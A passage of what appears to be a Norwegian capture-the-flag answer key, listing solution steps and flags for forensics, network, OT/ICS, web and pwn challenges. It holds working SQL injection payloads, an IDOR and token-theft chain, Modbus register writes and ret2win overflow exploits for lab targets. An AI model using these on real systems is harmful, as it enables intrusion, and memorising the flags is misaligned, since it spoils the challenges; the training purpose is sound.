4. Ignorer rapporter der alle keycode bytes er `00`, de betyr at tasten er
   sluppet.
5. Oversett keycodes med en USB HID usage table. Eksempler:

   ```text
   0x04 = a
   0x05 = b
   0x28 = Enter
   0x2c = mellomrom
   ```

6. Dersom modifier byte har Shift satt, må samme keycode tolkes som stor
   bokstav eller symbol. For eksempel gir Shift + `0x2f` tegnet `{`.
7. Den rekonstruerte terminalteksten inneholder:

   ```text
   export RECOVERY_CODE=CTF{usb_hid_tastene_husker}
   ```

Terminalbasert uthenting kan starte med:

```bash
tshark -r tasteloggen.pcap -Y 'usb.transfer_type == 0x01 && usb.capdata' \
  -T fields -e usb.capdata
```

Arrangørsolveren parser PCAP og USBPcap headerne direkte, filtrerer ut
tastaturrapportene og dekoder US keyboard layout:

```bash
python3 solver/solve.py
```

**Kontrollpunkter:**

- Det finnes litt USB musestøy i opptaket, men musedataene er 4 byte og skal
  ikke dekodes som tastatur.
- Flagget skal ikke ligge som ren streng i PCAP filen, det skal oppstå etter
  HID-dekoding.

**Flagg:** `CTF{usb_hid_tastene_husker}`

<a id="forensics-08-slettet-skiftlogg"></a>

## Slettet skiftlogg (`forensics-08-slettet-skiftlogg`)

**Kategori:** Forensics
**Poeng:** 200
**Type:** Statisk diskbilde

**Hva oppgaven tester:** FAT12-filtriage, slettede katalogoppføringer og
gjenoppretting med Sleuth Kit.

**Fremgangsmåte:**

1. Start med å identifisere filen:

   ```bash
   file skiftminne.img
   ```

   Den skal gjenkjennes som et lite FAT12-filsystem.

2. Bruk Sleuth Kit for å få struktur, rotkatalog og slettede filer:

   ```bash
   fsstat skiftminne.img
   fls -r skiftminne.img
   fls -r -d skiftminne.img
   ```

3. `fls -d` viser den slettede filen `_KIFTLOG.GZ`. I FAT erstattes første
   bokstav i slettede 8.3-filnavn med slettemarkøren, så dette tilsvarer en
   tidligere `SKIFTLOG.GZ`.
4. Bruk metadataadressen fra `fls`. I den genererte fasiten er adressen `6`:

   ```bash
   icat skiftminne.img 6 > gjenopprettet.gz
   file gjenopprettet.gz
   gzip -dc gjenopprettet.gz
   ```

5. Den utpakkede loggen inneholder kontrollkoden. Den synlige filen
   `SKIFT.TXT` inneholder bare en eldre testkode i feil flaggformat.

**Kontrollpunkter:**

- `file` skal vise FAT12.
- `fls -r -d` skal vise en slettet `_KIFTLOG.GZ`.
- `icat` på metadataadresse `6` skal gi gzip-data som pakkes ut til flagget.

**Flagg:** `CTF{slettet_betyr_ikke_borte}`

<a id="forensics-09-vedlegget-i-pdf"></a>

## Vedlegget i rapporten (`forensics-09-vedlegget-i-pdf`)

**Kategori:** Forensics
**Poeng:** 150
**Type:** Statisk PDF

**Hva oppgaven tester:** PDF-triage og innebygde filvedlegg.

**Fremgangsmåte:**

1. Start med vanlige PDF-verktøy:

   ```bash
   file revisjonsrapport.pdf
   pdfinfo revisjonsrapport.pdf
   ```

   PDF-en har én synlig side, men det betyr ikke at filen bare inneholder
   synlig tekst.

2. List innebygde vedlegg:

   ```bash
   pdfdetach -list revisjonsrapport.pdf
   ```

   Riktig resultat viser to filer:

   ```text
   kontrollnotat.txt
   lesmeg.txt
   ```

3. Lagre vedleggene:

   ```bash
   mkdir vedlegg
   pdfdetach -saveall -o vedlegg revisjonsrapport.pdf
   ls -la vedlegg
   ```

4. Les begge tekstfilene. `lesmeg.txt` er et overføringsnotat, mens
   `kontrollnotat.txt` inneholder en Base64-verdi.
5. Dekod Base64-verdien:

   ```bash
   printf '<BASE64-VERDI>' | base64 -d
   ```

**Kontrollpunkter:**

- `pdfdetach -list` skal vise nøyaktig to vedlegg.
- `pdfdetach -saveall` skal hente ut begge tekstfilene.
- Råflagget skal ikke ligge synlig i PDF-strengene uten å hente og dekode
  vedlegget.

**Flagg:** `CTF{pdf_vedlegg_gjemmer_mer}`

<a id="password-01-arkivportal"></a>

## Arkivportalen (`password-01-arkivportal`)

**Kategori:** Password Forensics
**Poeng:** 250
**Type:** Statisk ZIP og lokal HTML

**Hva oppgaven tester:** ZIP-cracking med wordlist, enkel logg-rekognosering,
base64-dekoding og bruk av en lokal HTML-portal.

**Fremgangsmåte:**

1. Last ned `standarkiv.zip` og `passordliste.txt`.
2. Bekreft at ZIP-en er passordbeskyttet:

   ```bash
   unzip -l standarkiv.zip
   ```

   `unzip` skal be om passord ved uthenting.

3. Crack ZIP-passordet med den vedlagte listen. Klassisk John-vei:

   ```bash
   zip2john standarkiv.zip > hash.txt
   john --wordlist=passordliste.txt hash.txt
   john --show hash.txt
   ```

   Riktig passord er `Nordverk2026!`. Alternativt kan `fcrackzip` brukes:

   ```bash
   fcrackzip -u -D -p passordliste.txt standarkiv.zip
   ```

4. Pakk ut arkivet og orienter deg:

   ```bash
   unzip standarkiv.zip
   find . -type f -print
   ```

5. Les `README.txt`, som peker mot loggen. Søk etter relevante ord:

   ```bash
   rg -n "kode|b64|debug|SKIFT" .
   ```

   I `logger/hendelser.log` ligger debugfeltet:

   ```text
   dagskode_b64=U0tJRlQtTk9SRExZUw==
   ```

6. Base64-dekod verdien:

   ```bash
   echo 'U0tJRlQtTk9SRExZUw==' | base64 -d
   ```

   Resultat: `SKIFT-NORDLYS`.

7. Les `notater/kodepraksis.txt`. Den sier at portalen bruker delen etter
   `SKIFT-`, normalisert til små bokstaver. Dagskoden blir `nordlys`.

8. Åpne `portal/portal.html` lokalt i nettleseren, skriv `nordlys`, og les
   flagget. Portalen dekrypterer flagget i JavaScript med dagskoden som nøkkel.

**Kontrollpunkter:**

- ZIP-en skal ikke kunne pakkes ut uten passord.
- Passordet skal finnes i `passordliste.txt`, slik at oppgaven ikke krever
  lang crackingtid.
- Dagskoden skal kunne finnes med vanlige tekstverktøy etter utpakking.
- Oppgaven krever ikke container eller nettverk.

**Flagg:** `CTF{zip_j0hn_b64_portal}`

<a id="misc-02-velkomststrom"></a>

## Velkomststrøm (`misc-02-velkomststrom`)

**Kategori:** Misc  
**Poeng:** 50  
**Type:** Statisk tekstfil

**Hva oppgaven tester:** Klassisk encoding-lag.

**Fremgangsmåte:**

1. Åpne `velkomst.txt`. Innholdet er hex-tegn.
2. Dekod hex til bytes. Resultatet er base64.
3. Base64-dekod. Resultatet er gzip-data.
4. Pakk ut gzip og les teksten:

   ```bash
   xxd -r -p velkomst.txt | base64 -d | gunzip
   ```

**Kontrollpunkter:**

- Dette er encoding, ikke kryptering. Ingen hemmelig nøkkel trengs.
- CyberChef skal kunne løse kjeden med `From Hex`, `From Base64`, `Gunzip`.

**Flagg:** `CTF{v3lk0mst_str0m_h1tch3d}`

<a id="misc-03-morse-rele"></a>

## Morse på releet (`misc-03-morse-rele`)

**Kategori:** Misc  
**Poeng:** 100  
**Type:** Statisk CSV

**Hva oppgaven tester:** Morse fra tidsseriedata.

**Fremgangsmåte:**

1. Åpne `relay_log.csv`. Den har rader med `start_ms`, `duration_ms` og
   `state`.
2. Finn minste ON-varighet. Det er én tidsenhet og tilsvarer prikk. Lange
   ON-pulser på tre tidsenheter tilsvarer strek.
3. OFF-pauser på omtrent én enhet er mellom prikk/strek i samme tegn, tre
   enheter er nytt tegn, og syv enheter er nytt ord/separator.
4. Manuell vei: skriv ned `.` og `-` for hver ON-puls, sett inn mellomrom ved
   lange OFF-pauser, og slå opp tegnene i en Morse-tabell.
5. Programmatisk vei, uten å vite meldingen på forhånd:

   ```python
   import csv

   rows = list(csv.DictReader(open("relay_log.csv")))
   on = [int(r["duration_ms"]) for r in rows if r["state"] == "ON"]
   unit = min(on)

   symbols = []
   current = []
   for row in rows:
       duration = int(row["duration_ms"])
       if row["state"] == "ON":
           current.append("." if duration < unit * 2 else "-")
       else:
           if duration >= unit * 7:
               symbols.append("".join(current)); current = []
               symbols.append("/")
           elif duration >= unit * 3:
               symbols.append("".join(current)); current = []
   if current:
       symbols.append("".join(current))

   print(" ".join(symbols))
   ```

6. Dekod Morse med internasjonal Morse. Bruk også kodene for `{`, `}` og `_`
   som hintet beskriver.

**Kontrollpunkter:**

- Det er ikke nødvendig med signalbehandling; CSV-en er allerede strukturert.
- Riktig dekoding gir flagget direkte, med store bokstaver.

**Flagg:** `CTF{MORSE_PA_RELEET_ER_KLASSIKER}`

<a id="misc-04-tonevalg"></a>

## Tonevalg (`misc-04-tonevalg`)

**Kategori:** Misc
**Poeng:** 125
**Type:** WAV

**Hva oppgaven tester:** DTMF-gjenkjenning og klassisk flertrykksdekoding fra
gamle mobiltelefoner.

**Fremgangsmåte:**

1. Åpne `tonevalg.wav` i Audacity eller et annet lydverktøy.
2. Bytt til spektrogramvisning. Hver tone består av ett lavt og ett høyt
   frekvensbånd, som er typisk for DTMF.
3. Dekod frekvensparene til DTMF-taster. Dette kan gjøres manuelt med en DTMF
   tabell, med et DTMF analyseverktøy eller med et lite Goertzel-script.
4. Den dekodede tastesekvensen er:

   ```text
   8#666#66#33#0#333#777#2#0#7777#33#66#8#777#2#555
   ```

5. Del sekvensen på `#`. `0` er mellomrom. De andre gruppene bruker
   flertrykksmetoden:

   ```text
   2=A, 22=B, 222=C
   3=D, 33=E, 333=F
   ```

6. Dette gir meldingen `TONE FRA SENTRAL`.
7. Normaliser etter flaggformatet, små bokstaver og understrek mellom ord.

Arrangørsolveren segmenterer lydfilen på energi, bruker Goertzel algoritmen
for DTMF-frekvensene og dekoder flertrykkssekvensen:

```bash
python3 solver/solve.py
```

**Kontrollpunkter:**

- Oppgaven skal kunne løses med Audacity pluss en DTMF tabell.
- Solver skal ikke kjenne tastesekvensen på forhånd, den skal beregne den fra
  WAV filen.

**Flagg:** `CTF{tone_fra_sentral}`

<a id="misc-05-radiovakten"></a>

## Radiovakten (`misc-05-radiovakten`)

**Kategori:** Misc
**Poeng:** 225
**Type:** Statisk tekstfil

**Hva oppgaven tester:** Historisk teleprinterkoding, ITA2/Baudot Murray,
modusbytte og bitrekkefølge.

**Fremgangsmåte:**

1. Åpne `radiotrafikk.txt` og les mottakerhodet. Det oppgir at symbolbredden
   er fem bits, og at bitene i hvert symbol er lagret med laveste bit først.
2. Del bitstrømmen i grupper på fem. Snu bitrekkefølgen i hver gruppe før
   gruppen tolkes som et tall:

   ```python
   value = int(bits[::-1], 2)
   ```

3. Fem bits gir bare 32 verdier, så samme verdi må bety ulike tegn avhengig av
   modus. Dette peker mot ITA2, også kjent som Baudot Murray.
4. Bruk en ITA2-tabell. Start i bokstavmodus. Verdien `27` bytter til figures,
   og verdien `31` bytter til letters.
5. Dekod hele strømmen. Den første delen er kalibrering, og den relevante
   operatørmeldingen er:

   ```text
   RADIO VAKTEN BYTTER MODUS 73
   ```

6. Normaliser til flaggformat med små bokstaver og understrek mellom ordene.

**Kontrollpunkter:**

- Hvis teksten blir nesten riktig, men enkelte tegn er rare, er enten
  bitrekkefølgen eller modusbyttet tolket feil.
- `73` skal komme fra figures-modus, ikke fra vanlig ASCII.
- Arrangørsolveren skal dekode strømmen fra bits, ikke lese meldingen som en
  hardkodet konstant.

**Flagg:** `CTF{radio_vakten_bytter_modus_73}`

<a id="misc-06-registersporet"></a>

## Registersporet (`misc-06-registersporet`)

**Kategori:** Misc
**Poeng:** 175
**Type:** Statiske tekstfiler

**Hva oppgaven tester:** Vim-makroer, registre og enkel Base64-dekoding.

**Fremgangsmåte:**

1. Åpne `makroopptak.txt`. Den sier at kilderegisteret er `q`, at makroen skal
   kjøres 32 ganger, og at målregisteret er `Z`.
2. Åpne `operatordagbok.txt` i Vim og tøm registeret:

   ```vim
   :let @z=''
   ```

3. Ta opp makroen i register `q`, eller legg den inn direkte. Ved manuell
   opptak:

   ```vim
   qq
   /^SPOR
   0f|2l"Zyl
   q
   ```

   Linjen `/^SPOR` avsluttes med Enter. Deretter går makroen til første `|`,
   flytter to tegn mot høyre og yanker ett tegn.

4. Kjør makroen 32 ganger og se på registeret:

   ```vim
   32@q
   :reg z
   ```

5. Stor `Z` i yank-kommandoen betyr at Vim legger til i register `z` i stedet
   for å overskrive det. Registeret ender derfor med en Base64-streng.
6. Dekod registerinnholdet:

   ```bash
   printf '<REGISTER_Z>' | base64 -d
   ```

**Kontrollpunkter:**

- Register `z` skal ende med `Q1RGe21ha3JvZW5fc2FtbGVyX3Nwb3J9`.
- Både Vim og Neovim skal gi samme registerinnhold.
- Regex-solveren er bare arrangørkontroll, deltakerstien skal være mulig med
  faktisk Vim-makro.

**Flagg:** `CTF{makroen_samler_spor}`

<a id="network-01-dns-lekkasje"></a>

## DNS i sidesporet (`network-01-dns-lekkasje`)

**Kategori:** Network  
**Poeng:** 125  
**Type:** PCAP

**Hva oppgaven tester:** DNS-exfil i subdomener.

**Fremgangsmåte:**

1. Åpne `dns_lekkasje.pcap` i Wireshark eller bruk `tshark`.
2. Filtrer på DNS:

   ```bash
   tshark -r dns_lekkasje.pcap -Y 'dns.qry.name contains "exfil.ctf-lab"' \
     -T fields -e dns.qry.name
   ```

3. Se etter queries under:

   ```text
   exfil.ctf-lab.nordverk.local
   ```

4. Første label har format `NN-<hex>`, der `NN` er rekkefølge.
5. Sorter på `NN`, lim sammen hex-delene og dekod som ASCII:

   ```bash
   tshark -r dns_lekkasje.pcap -Y 'dns.qry.name contains "exfil.ctf-lab"' \
     -T fields -e dns.qry.name \
   | cut -d. -f1 \
   | sort -n \
   | cut -d- -f2 \
   | tr -d '\n' \
   | xxd -r -p
   ```

**Kontrollpunkter:**

- Normal DNS-støy kan finnes, men exfil-domenet skal skille seg tydelig ut.
- Rekkefølgetallet er nødvendig for robust løsning.

**Flagg:** `CTF{dns_l3kkasje_i_subdomener}`

<a id="network-02-http-basic"></a>

## Basic på tråden (`network-02-http-basic`)

**Kategori:** Network  
**Poeng:** 175  
**Type:** PCAP

**Hva oppgaven tester:** HTTP Basic Auth i klarteksttrafikk.

**Fremgangsmåte:**

1. Åpne `basic_auth.pcap` i Wireshark.
2. Filtrer på HTTP, eller bruk `Statistics -> Conversations -> TCP` og følg
   aktuelle HTTP-strømmer.
3. Det finnes flere webkall og flere Basic Auth-headere. Noen er distraksjoner,
   for eksempel printer, kamera og IDP/MFA.
4. Se etter trafikk til:

   ```text
   Host: status.nordverk.local
   GET /admin/status HTTP/1.1
   ```

5. Finn headeren i den strømmen:

   ```text
   Authorization: Basic <base64>
   ```

6. Base64-dekod verdien. Resultatet har format:

   ```text
   stand:<passord>
   ```

7. Passorddelen er flagget.

   Terminalvei med `tshark`:

   ```bash
   tshark -r basic_auth.pcap -Y 'http.authbasic and http.host == "status.nordverk.local"' \
     -T fields -e http.authbasic
   ```

   Dekod verdien etter `Basic`:

   ```bash
   echo '<BASE64>' | base64 -d
   ```

**Kontrollpunkter:**

- Basic Auth er bare base64, ikke kryptering.
- PCAP-en skal ha flere pakker og flere Basic Auth-kandidater; riktig kandidat
  er `stand` mot `/admin/status`.
- Kjente distraksjoner: `demo:demo2026`, `viewer:NordverkViewer2026!`,
  `operator:MFA-required`, `support:summer-rotation-2026` og en base64-cache
  i en JSON-respons.

**Flagg:** `CTF{basic_auth_er_bare_base64}`

<a id="osint-01-finn-scenen"></a>

## Finn scenen (`osint-01-finn-scenen`)

**Kategori:** OSINT  
**Poeng:** 75  
**Type:** Frosset/statisk OSINT

**Hva oppgaven tester:** Sammenstilling av flere statiske kilder.

**Fremgangsmåte:**

1. Se på `skilt_foto.png`. Skiltet viser tittel og tidspunkt, men scenen er
   overmalt.
2. Noter:

   ```text
   State of Cyber Security 2026
   Torsdag 11. juni, kl. 11:00
   ```

3. Slå opp i `program_snapshot.txt` med søk, ikke levende web:

   ```bash
   rg -n "State of Cyber Security|11:00|Torsdag" program_snapshot.txt
   ```

4. Riktig rad sier at foredraget er på `Scene B - Storsalen`.
5. Slå opp scene-koden i `kodebok.md`:

   ```bash
   rg -n "Scene B|Storsalen|scene_b" kodebok.md
   ```

   `B` mapper til `scene_b_storsalen`.

**Kontrollpunkter:**

- Dette er frosset OSINT. Deltakeren skal ikke trenge levende nettsøk.
- Alle nødvendige data ligger i vedleggene.

**Flagg:** `CTF{scene_b_storsalen}`

<a id="ot-01-modbus-klartekst"></a>

## Modbus i klartekst (`ot-01-modbus-klartekst`)

**Kategori:** OT / ICS  
**Poeng:** 100  
**Type:** Statisk PCAP

**Hva oppgaven tester:** Lese Modbus-registere fra nettverkstrafikk.

**Fremgangsmåte:**

1. Åpne `modbus_capture.pcap` i Wireshark.
2. Filtrer på `modbus`. Alternativt med terminal:

   ```bash
   tshark -r modbus_capture.pcap -Y modbus -V
   ```

3. Finn en Function Code 3-response som returnerer 12 holding registers fra
   adresse 100.
4. I Wireshark: utvid `Modbus/TCP -> Modbus -> Data`. Registerverdiene er
   16-bit tall. Hvert register inneholder to ASCII-tegn, big-endian.
5. Hvis registerverdiene vises som hex, del dem i bytes og les som ASCII. For
   eksempel register `0x4b41` blir `K` + `A`.
6. Sett tegnene sammen til flagget.

**Kontrollpunkter:**

- Wireshark skal parse Modbus TCP direkte.
- Deltakeren trenger ikke aktiv kontakt med en PLC.

**Flagg:** `CTF{m0dbus_1s_n0t_s3cur3}`

<a id="ot-02-bop-modbus"></a>

## Brønn under press (`ot-02-bop-modbus`)

**Kategori:** OT / ICS  
**Poeng:** 300  
**Type:** Modbus TCP-container

**Hva oppgaven tester:** Aktiv Modbus-styring, register/coil-forståelse og
sikker rekkefølge.

**Fremgangsmåte:**

1. Koble til Modbus-tjenesten fra CTFd. Start med passiv lesing, ikke skriving.
2. Les registerkartet og kjør `recon_starter.py`:

   ```bash
   python recon_starter.py <HOST> <PORT>
   ```

   Det gir en snapshot av coils og holding registers. Med `modpoll` kan samme
   type rekognosering gjøres slik:

   ```bash
   modpoll -m tcp -p <PORT> -r 1 -c 5 <HOST>      # HR0-HR4
   modpoll -m tcp -p <PORT> -0 -t 0 -r 1 -c 4 <HOST>  # coils C0-C3
   ```

3. Forstå tilstanden fra registerkartet, ikke brute force:

   ```text
   C0 ESD_BYPASS       må være False
   HR0 BOP_STATUS      må være 0, lukket/trygt
   HR2 ESD_AKTIV       må være 1
   HR4 VENTIL_POSISJON må være 0
   C1 ALARM_UNDERTRYKK må være False
   ```

4. Skriv riktig gjenopprettingssekvens med `pymodbus`:

   ```python
   from pymodbus.client import ModbusTcpClient

   client = ModbusTcpClient("<HOST>", port=<PORT>)
   client.connect()
   client.write_coil(0, False)     # C0: Slå av ESD bypass
   client.write_register(0, 0)     # HR0: Lukk BOP
   client.write_register(2, 1)     # HR2: Aktiver ESD
   client.write_register(4, 0)     # HR4: Steng ventil
   client.write_coil(1, False)     # C1: Skru på alarmer
   ```

   Hold samme TCP-tilkobling åpen når du skriver sekvensen og leser
   flaggregistrene. Hosted-servicen isolerer BOP-tilstanden per tilkobling, slik
   at deltakere ikke påvirker hverandre.

5. Les status på nytt. `C3 TRYGG_TILSTAND` skal bli `True`.
6. Når tilstanden er korrekt, skrives flagget til HR10-HR27. Les disse
   registrene og dekod to ASCII-tegn per register:

   ```python
   regs = client.read_holding_registers(10, 18).registers
   flag = "".join(chr((r >> 8) & 0xff) + chr(r & 0xff) for r in regs)
   print(flag.rstrip("\\x00"))
   ```

**Kontrollpunkter:**

- Feil rekkefølge eller delvis tilstand skal ikke gi flagg.
- Oppgaven er mer prosesslogikk enn brute force.

**Flagg:** `CTF{bop_r3st0r3d_bl0w0ut_pr3v3nt3d}`

<a id="ot-03-mqtt"></a>

## Ukryptert anlegg (`ot-03-mqtt`)

**Kategori:** OT / ICS  
**Poeng:** 300  
**Type:** MQTT-broker

**Hva oppgaven tester:** MQTT-recon, wildcard subscribe og credentials-lekkasje.

**Fremgangsmåte:**

1. Koble til broker uten credentials først. Bruk vedlagt `mqtt_recon.py` eller
   standardverktøyet `mosquitto_sub`.
2. Abonner bredt på `#`:

   ```bash
   mosquitto_sub -h <HOST> -p <PORT> -t '#'
   ```

3. La klienten stå i 20-30 sekunder. Normal sensorstøy dukker opp først, men
   `plant/maintenance/debug` inneholder JSON med `user` og `pass`.
4. Koble til igjen med disse credentials:

   ```bash
   mosquitto_sub -h <HOST> -p <PORT> \
     -u operator -P 'Pl4tform42!' \
     -t 'plant/control/secure' -v
   ```

5. Flagget publiseres i JSON-payload på secure-topicet. Hvis man bruker Python,
   er poenget fortsatt det samme: wildcard-recon først, autentisert subscribe
   etterpå.

**Kontrollpunkter:**

- Første del skal være mulig anonymt, ellers får ikke deltakerne tak i
  credentials.
- Secure-topic skal kreve de lekkede credentials.

**Flagg:** `CTF{mqtt_w1ldcard_cr3d_l3ak}`

<a id="ot-04-scada-sqli"></a>

## HMI Tilgang (`ot-04-scada-sqli`)

**Kategori:** Web  
**Poeng:** 400  
**Type:** Flask/SQLite webapp

**Hva oppgaven tester:** SQL injection med enkelt filter som tvinger litt
tilpasning.

**Fremgangsmåte:**

1. Test innloggingen. `username` er parameterisert, men `password` settes rett
   inn i SQL-strengen.
2. Filteret blokkerer `--`, `#`, `/*` og ordet `OR`, men ikke `UNION`,
   `SELECT`, `'` eller `WHERE`.
3. Bruk UNION-basert injection i passordfeltet og balanser queryen med
   `WHERE '1'='1` i stedet for kommentar.
4. Finn kolonneantall:

   ```text
   username: x
   password: ' UNION SELECT 1,2,3 WHERE '1'='1
   ```

   Dashboard viser `Velkommen, 2`, altså vises kolonne 2.

5. List tabeller:

   ```text
   ' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table' AND '1'='1
   ```

6. Finn kolonner i `historian_archive`:

   ```text
   ' UNION SELECT 1,group_concat(name),3 FROM pragma_table_info('historian_archive') WHERE '1'='1
   ```

7. Hent hendelsene:

   ```text
   ' UNION SELECT 1,group_concat(event),3 FROM historian_archive WHERE '1'='1
   ```

   Flagget ligger i historikkhendelsene.

**Kontrollpunkter:**

- Vanlige `OR 1=1 --`-payloads skal feile, men oppgaven skal fortsatt være
  løselig med UNION.
- Det er viktig at dashboardet viser kolonne 2, ellers får ikke deltakerne en
  tydelig kanal ut.

**Flagg:** `CTF{uni0n_b4sed_sc4d4_pwn3d}`

<a id="ot-05-historian-api"></a>

## Historikkarkivet (`ot-05-historian-api`)

**Kategori:** Web  
**Poeng:** 500  
**Type:** Flask REST API

**Hva oppgaven tester:** Flerstegs API-angrep: enumering, IDOR, tokenlekkasje
og admin-rute.

**Fremgangsmåte:**

1. Landing page dokumenterer offentlige sensorruter:

   ```text
   /api/v1/sensors
   /api/v1/sensors/<id>
   /api/v1/sensors/<id>/logs
   ```

2. **Enumerer skjulte endepunkter** med en katalog-/sti-fuzzer. De
   udokumenterte rutene (`debug`, `admin`) ligger i vanlige ordlister:

   ```bash
   ffuf -u <URL>/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
   # alternativ:
   gobuster dir -u <URL>/api/v1/ -w /usr/share/wordlists/dirb/common.txt
   ```

   Dette gir treff på `/api/v1/debug` og `/api/v1/admin`. Hent så debug-ruten,
   som lister hele angrepsflaten inkludert `/api/v1/admin/flag`:

   ```bash
   curl <URL>/api/v1/debug/endpoints
   ```

   (Alternativ løsningsvei: man kan dirbuste seg direkte til `/api/v1/admin/flag`
   uten å gå via debug-endepunktet.)

3. `/api/v1/sensors` viser bare offentlige sensorer (1–3), men metadata antyder
   at interne/restricted sensorer finnes. Dette er IDOR — iterer ID-en for å nå
   dem. Ikke katalog-fuzzing, men ren ID-brute-force:

   ```bash
   # enkel bash-loop
   for i in $(seq 1 10); do
     echo "== sensor $i =="; curl -s <URL>/api/v1/sensors/$i/logs
   done

   # eller med ffuf over et tall-range
   ffuf -u <URL>/api/v1/sensors/FUZZ/logs -w <(seq 1 20)
   ```

4. Sensor 7 er `SYS-MAINT` og har `access: restricted`, men logger returneres
   likevel. Dette er IDOR.
5. I loggene ligger en `credential_sync`-post med base64-kodet `data`.
6. Dekod `data`. Den inneholder service-token:

   ```text
   svc-hist-4f8a2c1e-9d3b
   ```

7. Bruk tokenet mot admin-ruten:

   ```bash
   curl <URL>/api/v1/admin/flag \
     -H 'Authorization: Bearer svc-hist-4f8a2c1e-9d3b'
   ```

**Kontrollpunkter:**

- Oppgaven bør validere som en kjede. Hvert steg gir et nytt spor til neste.
- Feil eller manglende Bearer-token skal gi 401/403.

**Flagg:** `CTF{h1st0r14n_1d0r_ch41n_c0mpl3t3}`

<a id="pwn-00-retur-vaktbua"></a>

## Retur til vaktbua (`pwn-00-retur-vaktbua`)

**Kategori:** Pwn
**Poeng:** 100
**Type:** Statisk Linux ELF

**Hva oppgaven tester:** Første ret2win: overflow en liten stack-buffer og
overskriv returadressen med adressen til `win()`.

**Fremgangsmåte:**

1. Sjekk filtypen:

   ```bash
   file retur_vaktbua
   ```

   Forventet: 64-bit Linux ELF, ikke strippet. Ikke strippet betyr at
   funksjonsnavn fortsatt er synlige med `nm`.

2. Sjekk mitigations:

   ```bash
   checksec --file=retur_vaktbua
   ```

   Forventet:

   ```text
   Canary: No
   NX:     Enabled
   PIE:    No
   ```

   Dette peker mot ret2win: ikke shellcode, men hopp til en eksisterende
   funksjon med stabil adresse.

3. Finn målfunksjonen:

   ```bash
   nm -n retur_vaktbua | grep ' win$'
   ```

   Etter bygg er adressen:

   ```text
   0000000000401186 T win
   ```

4. Finn overflowen:

   ```bash
   objdump -d retur_vaktbua | grep -A35 '<registrer>:'
   ```

   Se etter disse linjene:

   ```text
   sub    $0x20,%rsp
   lea    -0x20(%rbp),%rax
   call   gets@plt
   ```

   `0x20` er 32 bytes. Etter bufferen ligger saved RBP på 8 bytes, og deretter
   saved RIP. Offset til returadressen er derfor:

   ```text
   32 + 8 = 40
   ```

5. Bygg og send payload:

   ```bash
   python3 - <<'PY' | ./retur_vaktbua
   import struct, sys
   payload = b"A" * 40
   payload += struct.pack("<Q", 0x401186)
   sys.stdout.buffer.write(payload + b"\n")
   PY
   ```

   `struct.pack("<Q", ...)` pakker adressen som little-endian 64-bit.

6. Programmet hopper til `win()` og printer flagget.

**Kontrollpunkter:**

- Flagget skal ikke dukke opp direkte med `strings retur_vaktbua`.
- `win()` skal være synlig med `nm`, siden dette er intro-nivå.
- Offseten skal være 40. Hvis programmet krasjer uten flagg, sjekk at adressen
  pakkes little-endian og at binæren er samme versjon som i release.

**Flagg:** `CTF{ret2win_forste_steg}`

<a id="pwn-01-buffer-boden"></a>

## Buffer på boden (`pwn-01-buffer-boden`)

**Kategori:** Pwn  
**Poeng:** 200  
**Type:** TCP-tjeneste

**Hva oppgaven tester:** Klassisk ret2win med stack overflow.

**Fremgangsmåte:**

1. Last ned `buffer` fra oppgaven og sjekk først hva slags binær det er:

   ```bash
   file buffer
   ```

   Forventet: 64-bit Linux ELF, ikke strippet. At den ikke er strippet gjør at
   funksjonsnavn som `win` fremdeles er synlige.

2. Kjør `checksec`:

   ```bash
   checksec --file=buffer
   ```

   Forventet:

   ```text
   Canary: No
   NX:     Enabled
   PIE:    No
   ```

   Dette betyr:

   - Ingen canary: et stack overflow kan nå saved RIP uten å bli stoppet.
   - NX på: shellcode på stacken er feil retning.
   - Ikke PIE: funksjonsadresser er stabile, så `win()` har samme adresse lokalt
     og på serveren.

3. Kjør programmet én gang normalt:

   ```bash
   ./buffer
   ```

   Det spør etter navn og printer deg som vanlig gjest. Målet er å få programmet
   til å hoppe til VIP-funksjonen i stedet for å returnere normalt.

4. Finn interessant funksjon:

   ```bash
   nm -n buffer | grep ' win$'
   ```

   I denne binæren:

   ```text
   00000000004011a6 T win
   ```

   Alternativt:

   ```bash
   objdump -d buffer | grep -A20 '<win>:'
   ```

   `win()` leser `/flag.txt` og printer flagget.

5. Finn sårbarheten i `greet()`:

   ```bash
   objdump -d buffer | grep -A45 '<greet>:'
   ```

   De viktige linjene er:

   ```text
   subq $0x40, %rsp
   leaq -0x40(%rbp), %rax
   call gets@plt
   ```

   `subq $0x40` reserverer 64 bytes til `name`, og `gets()` leser uten
   lengdesjekk. Stack-layouten blir:

   ```text
   64 bytes  name-buffer
   8 bytes   saved RBP
   8 bytes   saved RIP  <- denne må overskrives
   ```

   Offset til saved RIP er derfor `64 + 8 = 72` bytes. Dette kan også bekreftes
   med `cyclic 100` i GDB, men i denne oppgaven er layouten enkel nok til å lese
   direkte fra disassembly.

6. Finn en enkel `ret`-gadget:

   ```bash
   objdump -d buffer | grep 'ret'
   ```

   En stabil gadget er:

   ```text
   0x401016: ret
   ```

   Den ekstra `ret`-en er med for stack alignment på amd64. Hvis man hopper rett
   til `win()`, kan programmet krasje inne i libc-kall som `printf()`. En ekstra
   `ret` flytter stacken 8 bytes og gir riktig 16-byte alignment før `win()`
   gjør sine egne kall.

7. Bygg payloaden:

   ```python
   import struct

   offset = 72
   ret = 0x401016
   win = 0x4011a6

   payload = b"A" * offset
   payload += struct.pack("<Q", ret)
   payload += struct.pack("<Q", win)
   ```

   `<Q` betyr little-endian 64-bit adresse, som passer x86-64 Linux.

8. Send payload til tjenesten:

   ```bash
   python3 - <<'PY' | nc <HOST> <PORT>
   import struct, sys
   payload = b"A" * 72
   payload += struct.pack("<Q", 0x401016)
   payload += struct.pack("<Q", 0x4011a6)
   sys.stdout.buffer.write(payload + b"\n")
   PY
   ```

   For CTFd Hosted brukes host/port fra oppgaven, for eksempel:

   ```bash
   nc 0.cloud.chals.io <PORT>
   ```

   Hvis du bruker pwntools er samme payload:

   ```python
   from pwn import *

   elf = ELF("./buffer")
   io = remote("<HOST>", <PORT>)
   io.recvuntil(b"navn:")
   payload = b"A" * 72 + p64(0x401016) + p64(elf.symbols["win"])
   io.sendline(payload)
   print(io.recvall().decode(errors="replace"))
   ```

9. Serveren printer VIP-tekst og flagget.

**Kontrollpunkter:**

- Dette er ikke shellcode; NX er på. Riktig metode er ret2win.
- `win()` må være synlig og stabil fordi PIE er av.
- Offseten skal være 72. Hvis exploit kun printer vanlig gjest eller krasjer
  uten flagg, sjekk offset først.
